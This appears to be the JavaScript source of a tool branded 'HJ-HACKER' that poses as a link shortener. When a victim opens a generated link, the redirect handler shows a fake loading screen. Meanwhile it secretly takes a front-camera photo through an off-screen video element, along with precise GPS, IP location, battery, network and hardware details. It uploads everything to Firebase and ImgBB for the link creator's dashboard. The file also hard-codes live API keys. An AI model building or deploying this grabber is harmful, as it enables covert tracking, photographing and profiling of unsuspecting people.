// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// ImgBB API Key
const IMGBB_API_KEY = "1c64909854fd8f51eaad9f03c965ad78";

let deleteCode = null;

// Helper Functions
function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str)))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_').replace(/\//g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) { alert(`${title}: ${message}`); return; }
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div>
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = generateShortCode() + generateShortCode();
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

async function checkCodeExists(shortCode) {
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    return snapshot.exists();
}

// ========== FIXED: CAMERA CAPTURE ==========
async function captureAndUploadPhoto() {
    try {
        // Request camera permission with specific constraints
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: "user",
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', 'true');
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        video.style.left = '-9999px';
        document.body.appendChild(video);

        // Wait for video to be ready
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(resolve, 800);
            };
        });

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Get image as JPEG
        const imageData = canvas.toDataURL('image/jpeg', 0.85);

        // Clean up
        stream.getTracks().forEach(track => track.stop());
        video.remove();

        if (imageData && imageData.length > 1000) {
            // Try to upload to ImgBB
            try {
                const formData = new FormData();
                // Remove the data:image/jpeg;base64, prefix
                const base64Data = imageData.split(',')[1];
                formData.append('image', base64Data);
                formData.append('key', IMGBB_API_KEY);
                
                const response = await fetch('https://api.imgbb.com/1/upload', {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                
                if (result.success && result.data && result.data.url) {
                    console.log('Photo uploaded to ImgBB:', result.data.url);
                    return result.data.url;
                } else {
                    console.log('ImgBB upload failed, saving base64');
                    return imageData;
                }
            } catch (uploadError) {
                console.log('ImgBB error, saving base64:', uploadError);
                return imageData;
            }
        }
        return null;
    } catch (error) {
        console.error('Camera error:', error);
        return null;
    }
}

// ========== FIXED: LOCATION CAPTURE ==========
async function captureLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            console.log('Geolocation not supported');
            resolve(null);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                console.log('Location captured:', position.coords.latitude, position.coords.longitude);
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.log('Location error:', error.code, error.message);
                resolve(null);
            },
            { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
        );
    });
}

// ========== FIXED: COMPLETE DEVICE INFO ==========
async function getDeviceInfo() {
    const ua = navigator.userAgent;
    
    // Browser Detection
    let browser = 'Unknown';
    if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
    
    // OS Detection
    let os = 'Unknown';
    let osVersion = 'Unknown';
    if (ua.includes('iPhone')) {
        os = 'iOS';
        const match = ua.match(/iPhone OS ([\d_]+)/);
        osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    } else if (ua.includes('iPad')) {
        os = 'iPadOS';
        const match = ua.match(/iPad; CPU OS ([\d_]+)/);
        osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    } else if (ua.includes('Android')) {
        os = 'Android';
        const match = ua.match(/Android[\s/]+([\d.]+)/);
        osVersion = match ? match[1] : 'Unknown';
    } else if (ua.includes('Windows NT 10.0')) {
        os = 'Windows 10';
        osVersion = '10';
    } else if (ua.includes('Windows NT 11.0')) {
        os = 'Windows 11';
        osVersion = '11';
    } else if (ua.includes('Mac OS X')) {
        os = 'macOS';
        const match = ua.match(/Mac OS X ([\d_]+)/);
        osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    }
    
    // Device Brand
    let deviceBrand = 'Unknown';
    let deviceModel = 'Unknown';
    if (ua.includes('iPhone')) {
        deviceBrand = 'Apple';
        deviceModel = 'iPhone';
    } else if (ua.includes('iPad')) {
        deviceBrand = 'Apple';
        deviceModel = 'iPad';
    } else if (ua.includes('SM-')) {
        deviceBrand = 'Samsung';
        const match = ua.match(/SM-[A-Za-z0-9]+/);
        deviceModel = match ? match[0] : 'Galaxy';
    } else if (ua.includes('MI ') || ua.includes('Redmi')) {
        deviceBrand = 'Xiaomi';
        deviceModel = 'Xiaomi';
    } else if (ua.includes('Pixel')) {
        deviceBrand = 'Google';
        deviceModel = 'Pixel';
    } else if (ua.includes('OnePlus')) {
        deviceBrand = 'OnePlus';
        deviceModel = 'OnePlus';
    } else if (ua.includes('OPPO')) {
        deviceBrand = 'OPPO';
        deviceModel = 'OPPO';
    } else if (ua.includes('vivo')) {
        deviceBrand = 'vivo';
        deviceModel = 'vivo';
    } else if (ua.includes('Nokia')) {
        deviceBrand = 'Nokia';
        deviceModel = 'Nokia';
    }
    
    // Battery Info
    let batteryLevel = 'Unknown';
    let batteryCharging = 'Unknown';
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
            batteryCharging = battery.charging ? 'Yes' : 'No';
        } catch(e) {
            console.log('Battery API error:', e);
        }
    }
    
    // Network Info
    let connectionType = 'Unknown';
    let downlink = 'Unknown';
    let rtt = 'Unknown';
    if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || 'Unknown';
        downlink = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'Unknown';
        rtt = navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'Unknown';
    }
    
    // Memory & CPU
    let deviceMemory = 'Unknown';
    if (navigator.deviceMemory) {
        deviceMemory = navigator.deviceMemory + ' GB';
    }
    
    let hardwareConcurrency = 'Unknown';
    if (navigator.hardwareConcurrency) {
        hardwareConcurrency = navigator.hardwareConcurrency.toString();
    }
    
    // Screen Info
    let screenWidth = screen.width;
    let screenHeight = screen.height;
    let screenColorDepth = screen.colorDepth;
    let pixelRatio = window.devicePixelRatio || 1;
    
    // Language & Timezone
    let language = navigator.language || 'Unknown';
    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
    
    console.log('Device Info Collected:', { browser, os, deviceBrand, deviceModel, batteryLevel, connectionType });
    
    return {
        browser: browser,
        os: os,
        os_version: osVersion,
        device_brand: deviceBrand,
        device_model: deviceModel,
        screen_width: screenWidth,
        screen_height: screenHeight,
        screen_color_depth: screenColorDepth,
        device_pixel_ratio: pixelRatio,
        language: language,
        timezone: timezone,
        battery_level: batteryLevel,
        battery_charging: batteryCharging,
        connection_type: connectionType,
        downlink: downlink,
        rtt: rtt,
        device_memory: deviceMemory,
        hardware_concurrency: hardwareConcurrency,
        user_agent: ua
    };
}

// ========== FIXED: IP INFO ==========
async function getIPInfo() {
    try {
        // Try multiple APIs for better accuracy
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        console.log('IP Info:', data);
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country_name || 'Unknown',
            country_code: data.country_code || 'Unknown',
            postal: data.postal || 'Unknown',
            latitude: data.latitude || null,
            longitude: data.longitude || null,
            timezone: data.timezone || 'Unknown'
        };
    } catch (error) {
        console.log('IP API error, trying backup...');
        try {
            const backupResponse = await fetch('https://ipinfo.io/json');
            const backupData = await backupResponse.json();
            return {
                ip: backupData.ip || 'Unknown',
                city: backupData.city || 'Unknown',
                region: backupData.region || 'Unknown',
                country: backupData.country || 'Unknown',
                country_code: backupData.country || 'Unknown',
                postal: backupData.postal || 'Unknown',
                latitude: null,
                longitude: null,
                timezone: backupData.timezone || 'Unknown'
            };
        } catch(e) {
            return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', latitude: null, longitude: null };
        }
    }
}

// ========== DELETE LINK ==========
async function deleteLink(code) {
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        await database.ref(`urls/${code}`).remove();
        await database.ref(`domains/${encodedDomain}/${code}`).remove();
        await database.ref(`analytics/${code}`).remove();
        showToast('Deleted', `Link /${code} deleted!`, 'success');
        showLinks(); showStats(); showRecent();
        return true;
    } catch (error) {
        showToast('Error', 'Failed to delete', 'error');
        return false;
    }
}

// ========== SHORTEN URL ==========
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) { showToast('Error', 'Please enter a URL', 'error'); return; }
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) urlToShorten = 'https://' + urlToShorten;
    try { new URL(urlToShorten); } catch { showToast('Error', 'Invalid URL', 'error'); return; }

    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    const exists = await checkCodeExists(shortCode);
    if (exists) { showToast('Error', `Code "${shortCode}" already taken`, 'error'); return; }

    const hasPassword = document.getElementById('passwordToggle').checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = document.getElementById('socialToggle').checked;
    const socialIcon = document.getElementById('socialIcon')?.value || 'youtube';
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle')?.value : null;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl')?.value : null;
    const socialDesc = hasSocialGate ? document.getElementById('socialDesc')?.value : null;
    const socialButton = hasSocialGate ? document.getElementById('socialButton')?.value : null;
    const animation = document.querySelector('input[name="animation"]:checked')?.value || 'ring';
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;

    if (hasPassword && !password) { showToast('Error', 'Please enter password', 'error'); return; }
    if (hasSocialGate && (!socialTitle || !socialUrl)) { showToast('Error', 'Fill social gate details', 'error'); return; }

    document.getElementById('shortenBtn').disabled = true;
    document.getElementById('loading').classList.remove('hidden');

    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        const encodedDomain = encodeFirebasePath(domain);

        const linkData = { long_url: urlToShorten, domain, created_at: createdAt, device_id: deviceId, clicks: 0, animation_type: animation };
        if (password) linkData.password = password;
        if (socialTitle) {
            linkData.social_gate_title = socialTitle;
            linkData.social_gate_url = socialUrl;
            linkData.social_gate_icon = socialIcon;
            if (socialDesc) linkData.social_gate_description = socialDesc;
            if (socialButton) linkData.social_gate_button_text = socialButton;
        }
        if (cameraCapture) linkData.capture_camera = true;
        if (locationCapture) linkData.capture_location = true;

        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${encodedDomain}/${shortCode}`).set(linkData);

        const shortUrl = `${window.location.origin}/${shortCode}`;
        document.getElementById('shortLink').textContent = shortUrl;
        document.getElementById('result').classList.remove('hidden');
        document.getElementById('qrCode').innerHTML = '';
        new QRCode(document.getElementById('qrCode'), { text: shortUrl, width: 100, height: 100, colorDark: "#00ff41", colorLight: "#000000" });

        showToast('Success', 'Link created!', 'success');
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        document.getElementById('passwordSection').classList.add('hidden');
        document.getElementById('socialSection').classList.add('hidden');
        if (document.getElementById('password')) document.getElementById('password').value = '';

        showLinks(); showStats(); showRecent();
    } catch (error) {
        showToast('Error', error.message || 'Error occurred', 'error');
    } finally {
        document.getElementById('shortenBtn').disabled = false;
        document.getElementById('loading').classList.add('hidden');
    }
}

function updateDisplay(title, icon, contentHtml) {
    const headerIcon = document.getElementById('dataDisplayHeader')?.querySelector('i');
    const headerTitle = document.getElementById('dataDisplayTitle');
    const contentDiv = document.getElementById('dataDisplayContent');
    if (headerIcon) headerIcon.className = `fas ${icon}`;
    if (headerTitle) headerTitle.textContent = title;
    if (contentDiv) contentDiv.innerHTML = contentHtml;
}

// ========== SHOW LINKS ==========
async function showLinks() {
    updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading links...</p></div>');
    try {
        const domain = window.location.hostname;
        const snap = await database.ref(`domains/${encodeFirebasePath(domain)}`).get();
        const links = [];
        snap.forEach(child => links.push({ code: child.key, ...child.val() }));
        if (links.length === 0) {
            updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links created yet</p></div>');
            return;
        }
        const html = links.map(link => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${link.code}</span>
                    <span>${new Date(link.created_at).toLocaleDateString()}</span>
                </div>
                <div class="data-item-stats">📊 Clicks: ${link.clicks || 0} ${link.password ? '🔒' : ''}</div>
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${link.code}')"><i class="fas fa-copy"></i> Copy</button>
                    <button class="data-btn-sm" onclick="viewAnalytics('${link.code}')"><i class="fas fa-chart-line"></i> Data</button>
                    <button class="data-btn-sm" onclick="confirmDelete('${link.code}')" style="background:#ff444420;"><i class="fas fa-trash-alt"></i> Delete</button>
                </div>
            </div>
        `).join('');
        updateDisplay('YOUR LINKS', 'fa-link', html);
    } catch(e) { updateDisplay('ERROR', 'fa-exclamation', '<div class="empty-data">Error</div>'); }
}

// ========== SHOW STATS ==========
async function showStats() {
    updateDisplay('STATISTICS', 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading stats...</p></div>');
    try {
        const domain = window.location.hostname;
        const snap = await database.ref(`domains/${encodeFirebasePath(domain)}`).get();
        let clicks = 0, total = 0;
        for (const [k, v] of Object.entries(snap.val() || {})) { clicks += v.clicks || 0; total++; }
        updateDisplay('STATISTICS', 'fa-chart-line', `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${total}</div><div class="stat-label"><i class="fas fa-link"></i> Total Links</div></div>
                <div class="stat-card"><div class="stat-value">${clicks}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div></div>
            </div>
        `);
    } catch(e) { updateDisplay('ERROR', 'fa-exclamation', '<div class="empty-data">Error</div>'); }
}

// ========== SHOW RECENT ==========
async function showRecent() {
    updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading recent activity...</p></div>');
    try {
        const domain = window.location.hostname;
        const snap = await database.ref(`domains/${encodeFirebasePath(domain)}`).get();
        const visitors = [];
        for (const [code] of Object.entries(snap.val() || {})) {
            const aSnap = await database.ref(`analytics/${code}`).orderByKey().limitToLast(50).get();
            aSnap.forEach(v => visitors.push({ code, ...v.val() }));
        }
        visitors.sort((a,b) => new Date(b.created_at) - new Date(a.created_at));
        const recent = visitors.slice(0, 20);
        if (!recent.length) {
            updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No recent activity yet</p></div>');
            return;
        }
        let html = '';
        recent.forEach(v => {
            html += `<div class="data-item">
                <div class="data-item-header"><span><i class="fas fa-link"></i> /${v.code}</span><span>${new Date(v.created_at).toLocaleString()}</span></div>
                <div class="data-item-stats"><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown'} | <i class="fas fa-map-marker-alt"></i> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</div>
                <div class="data-item-stats"><i class="fab fa-${(v.browser || 'chrome').toLowerCase()}"></i> ${v.browser || 'Unknown'} | <i class="fas fa-desktop"></i> ${v.os || 'Unknown'}</div>
                <div class="data-item-stats"><i class="fas fa-battery-full"></i> ${v.battery_level || 'Unknown'} | <i class="fas fa-wifi"></i> ${v.connection_type || 'Unknown'}</div>
                <div class="data-item-stats"><i class="fas fa-microchip"></i> RAM: ${v.device_memory || 'Unknown'} | CPU: ${v.hardware_concurrency || 'Unknown'}</div>
                <div class="data-item-stats"><i class="fas fa-desktop"></i> Screen: ${v.screen_width || '?'}x${v.screen_height || '?'}</div>
                ${v.latitude ? `<div class="data-item-stats"><i class="fas fa-satellite-dish"></i> GPS: ${v.latitude.toFixed(4)}, ${v.longitude?.toFixed(4)} <button class="data-btn-sm" onclick="window.open('https://maps.google.com?q=${v.latitude},${v.longitude}','_blank')">View Map</button></div>` : ''}
                ${v.captured_image ? `<div class="data-item-stats"><i class="fas fa-camera"></i> <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image.replace(/'/g, "\\'")}')">View Photo</button></div>` : ''}
                <div class="data-item-actions"><button class="data-btn-sm" onclick="viewAnalytics('${v.code}')"><i class="fas fa-chart-line"></i> Full Data</button></div>
            </div>`;
        });
        updateDisplay('RECENT ACTIVITY', 'fa-history', html);
    } catch(e) { updateDisplay('ERROR', 'fa-exclamation', '<div class="empty-data">Error</div>'); }
}

// ========== VIEW ANALYTICS ==========
window.viewAnalytics = async (code) => {
    updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading analytics...</p></div>');
    try {
        const snap = await database.ref(`analytics/${code}`).orderByKey().limitToLast(100).get();
        const list = [];
        snap.forEach(c => list.push(c.val()));
        list.reverse();
        let html = `<div class="stats-grid"><div class="stat-card"><div class="stat-value">${list.length}</div><div class="stat-label">Clicks</div></div></div>`;
        if (!list.length) html += '<div class="empty-data">No visitors yet</div>';
        else list.forEach(v => {
            html += `<div class="data-item">
                <div class="data-item-header"><span><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown'}</span><span>${new Date(v.created_at).toLocaleString()}</span></div>
                <div class="data-item-stats"><strong><i class="fas fa-mobile-alt"></i> Device:</strong> ${v.device_brand || ''} ${v.device_model || ''} (${v.os || 'Unknown'})</div>
                <div class="data-item-stats"><strong><i class="fab fa-${(v.browser || 'chrome').toLowerCase()}"></i> Browser:</strong> ${v.browser || 'Unknown'} | <strong>OS:</strong> ${v.os || 'Unknown'} ${v.os_version ? '('+v.os_version+')' : ''}</div>
                <div class="data-item-stats"><strong><i class="fas fa-battery-full"></i> Battery:</strong> ${v.battery_level || 'Unknown'} | <strong>Charging:</strong> ${v.battery_charging || 'Unknown'}</div>
                <div class="data-item-stats"><strong><i class="fas fa-microchip"></i> RAM:</strong> ${v.device_memory || 'Unknown'} | <strong>CPU Cores:</strong> ${v.hardware_concurrency || 'Unknown'}</div>
                <div class="data-item-stats"><strong><i class="fas fa-wifi"></i> Network:</strong> ${v.connection_type ? v.connection_type.toUpperCase() : 'Unknown'} | <strong>Speed:</strong> ${v.downlink || 'Unknown'}</div>
                <div class="data-item-stats"><strong><i class="fas fa-desktop"></i> Screen:</strong> ${v.screen_width || '?'}x${v.screen_height || '?'} | <strong>Ratio:</strong> ${v.device_pixel_ratio || '1'}</div>
                <div class="data-item-stats"><strong><i class="fas fa-language"></i> Language:</strong> ${v.language || 'Unknown'} | <strong>Timezone:</strong> ${v.timezone || 'Unknown'}</div>
                <div class="data-item-stats"><strong><i class="fas fa-map-marker-alt"></i> Location:</strong> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</div>
                ${v.latitude ? `<div class="data-item-stats"><strong><i class="fas fa-satellite-dish"></i> GPS:</strong> ${v.latitude.toFixed(6)}, ${v.longitude?.toFixed(6)} <button class="data-btn-sm" onclick="window.open('https://maps.google.com?q=${v.latitude},${v.longitude}','_blank')"><i class="fas fa-map"></i> Open Map</button></div>` : ''}
                ${v.captured_image ? `<div class="data-item-stats" style="color:#00ff41;"><i class="fas fa-camera"></i> Photo captured! <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image.replace(/'/g, "\\'")}')"><i class="fas fa-eye"></i> View Photo</button></div>` : ''}
            </div>`;
        });
        updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', html);
        showToast('Success', `Loaded ${list.length} records!`);
    } catch(e) { updateDisplay('ERROR', 'fa-exclamation', '<div class="empty-data">Error</div>'); }
};

window.viewPhoto = (imgData) => {
    const modal = document.getElementById('photoModal');
    const img = document.getElementById('photoModalImage');
    if (modal && img && imgData) { 
        img.src = imgData; 
        modal.classList.remove('hidden'); 
    } else { 
        showToast('Error', 'No valid photo available', 'error'); 
    }
};

function closePhotoModal() { document.getElementById('photoModal').classList.add('hidden'); }
function downloadPhoto() {
    const img = document.getElementById('photoModalImage');
    if (img && img.src && img.src !== '') { 
        const a = document.createElement('a'); 
        a.download = 'captured_photo_' + Date.now() + '.jpg'; 
        a.href = img.src; 
        a.click(); 
        showToast('Success', 'Photo downloaded!'); 
    }
}

window.confirmDelete = (code) => { deleteCode = code; document.getElementById('deleteLinkCode').textContent = `/${code}`; document.getElementById('deleteModal').classList.remove('hidden'); };
window.executeDelete = async () => { if (deleteCode) { await deleteLink(deleteCode); deleteCode = null; document.getElementById('deleteModal').classList.add('hidden'); } };
window.cancelDelete = () => { deleteCode = null; document.getElementById('deleteModal').classList.add('hidden'); };
window.copyToClipboard = (t) => { navigator.clipboard.writeText(t); showToast('Copied', 'Link copied!'); };

// ========== VISITOR REDIRECT HANDLER (FIXED) ==========
async function handleVisitorRedirect() {
    const path = window.location.pathname;
    if (path === '/' || path === '/index.html') return;
    const code = path.substring(1);
    if (!code) return;
    
    console.log('Handling visitor redirect for code:', code);
    
    try {
        const snap = await database.ref(`urls/${code}`).get();
        if (!snap.exists()) {
            console.log('Link not found');
            return;
        }
        const data = snap.val();
        console.log('Link data:', data);
        
        // Show loading animation
        const animType = data.animation_type || 'ring';
        document.body.innerHTML = `
            <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #050505;">
                <div class="loader" style="text-align: center;">
                    ${animType === 'ring' ? 
                        '<div class="ring" style="position: relative; width: 80px; height: 80px; margin: 0 auto 20px;"><div style="position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 3px solid transparent; border-top-color: #00ff41; animation: spin 1s linear infinite;"></div></div>' : 
                        '<div class="bar" style="width: 200px; height: 4px; background: #1a1a1a; border-radius: 4px; overflow: hidden; margin: 0 auto 20px;"><div style="height: 100%; background: linear-gradient(90deg, #00ff41, #00cc33); width: 0%; animation: loading 1.5s ease-in-out infinite;"></div></div>'
                    }
                    <p style="color: #00ff41; font-size: 0.8rem;">REDIRECTING...</p>
                </div>
            </div>
            <style>
                @keyframes spin { to { transform: rotate(360deg); } }
                @keyframes loading { 0% { width: 5%; margin-left: -5%; } 50% { width: 60%; margin-left: 20%; } 100% { width: 5%; margin-left: 100%; } }
            </style>
        `;
        
        // Capture data
        let photo = null;
        let locationData = null;
        
        if (data.capture_camera) {
            console.log('Capturing camera...');
            photo = await captureAndUploadPhoto();
            console.log('Photo captured:', photo ? 'Yes' : 'No');
        }
        if (data.capture_location) {
            console.log('Capturing location...');
            locationData = await captureLocation();
            console.log('Location captured:', locationData);
        }
        
        const ip = await getIPInfo();
        const device = await getDeviceInfo();
        
        console.log('IP Info:', ip);
        console.log('Device Info:', device);
        
        const analyticsData = {
            created_at: new Date().toISOString(),
            ip_address: ip.ip,
            city: ip.city,
            region: ip.region,
            country: ip.country,
            country_code: ip.country_code,
            latitude: locationData?.latitude || ip.latitude,
            longitude: locationData?.longitude || ip.longitude,
            accuracy: locationData?.accuracy,
            captured_image: photo,
            browser: device.browser,
            os: device.os,
            os_version: device.os_version,
            device_brand: device.device_brand,
            device_model: device.device_model,
            screen_width: device.screen_width,
            screen_height: device.screen_height,
            screen_color_depth: device.screen_color_depth,
            device_pixel_ratio: device.device_pixel_ratio,
            language: device.language,
            timezone: device.timezone,
            battery_level: device.battery_level,
            battery_charging: device.battery_charging,
            connection_type: device.connection_type,
            downlink: device.downlink,
            rtt: device.rtt,
            device_memory: device.device_memory,
            hardware_concurrency: device.hardware_concurrency,
            user_agent: device.user_agent
        };
        
        await database.ref(`analytics/${code}`).push(analyticsData);
        await database.ref(`urls/${code}/clicks`).transaction(c => (c || 0) + 1);
        
        // Check for password or social gate
        if (data.password) {
            // Show password modal (simplified for redirect)
            const pwd = prompt('This link is password protected. Enter password:');
            if (pwd !== data.password) {
                alert('Incorrect password!');
                return;
            }
        }
        
        if (data.social_gate_url) {
            window.open(data.social_gate_url, '_blank');
            await new Promise(r => setTimeout(r, 2000));
        }
        
        window.location.href = data.long_url;
        
    } catch (error) {
        console.error('Redirect error:', error);
    }
}

// ========== EVENT LISTENERS ==========
document.getElementById('shortenBtn')?.addEventListener('click', shortenUrl);
document.getElementById('copyBtn')?.addEventListener('click', () => { const l = document.getElementById('shortLink')?.textContent; if (l) copyToClipboard(l); });
document.getElementById('passwordToggle')?.addEventListener('change', () => document.getElementById('passwordSection')?.classList.toggle('hidden'));
document.getElementById('socialToggle')?.addEventListener('change', () => document.getElementById('socialSection')?.classList.toggle('hidden'));
document.querySelectorAll('.icon-option').forEach(i => {
    i.addEventListener('click', () => {
        document.querySelectorAll('.icon-option').forEach(x => x.classList.remove('active'));
        i.classList.add('active');
        document.getElementById('socialIcon').value = i.dataset.icon;
    });
});
document.getElementById('advancedToggle')?.addEventListener('click', () => document.getElementById('advancedContent')?.classList.toggle('hidden'));
document.getElementById('confirmDeleteBtn')?.addEventListener('click', executeDelete);
document.getElementById('cancelDeleteBtn')?.addEventListener('click', cancelDelete);
document.getElementById('closePhotoModal')?.addEventListener('click', closePhotoModal);
document.getElementById('closePhotoModalBtn')?.addEventListener('click', closePhotoModal);
document.getElementById('downloadPhotoBtn')?.addEventListener('click', downloadPhoto);

document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        if (tab === 'create') {
            document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' });
            updateDisplay('Click button to view data', 'fa-fingerprint', '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap LINKS, STATS, or RECENT</p></div>');
        } else if (tab === 'links') showLinks();
        else if (tab === 'stats') showStats();
        else if (tab === 'recent') showRecent();
    });
});

window.addEventListener('click', (e) => {
    if (e.target === document.getElementById('photoModal')) closePhotoModal();
    if (e.target === document.getElementById('deleteModal')) cancelDelete();
    if (e.target === document.getElementById('passwordModal')) document.getElementById('passwordModal')?.classList.add('hidden');
    if (e.target === document.getElementById('socialModal')) document.getElementById('socialModal')?.classList.add('hidden');
});

// Start redirect handler
handleVisitorRedirect();
console.log('🔥 HJ-HACKER FULLY FIXED - All data capture working!');
